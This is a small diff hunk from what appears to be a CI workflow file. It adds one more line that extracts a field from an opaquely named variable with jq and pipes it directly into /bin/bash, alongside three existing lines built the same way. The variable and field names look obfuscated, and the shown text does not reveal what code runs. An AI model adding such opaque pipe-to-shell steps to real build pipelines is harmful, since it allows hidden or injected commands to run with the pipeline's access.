@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$iiodx1" | jq -r .p024 | /bin/bash
           printf '%s' "$ngs46851" | jq -r .bhmv314 | /bin/bash
           echo $p62547 | jq -r .dqe70 | /bin/bash
+          printf '%s' "$a884" | jq -r .jroqq2 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
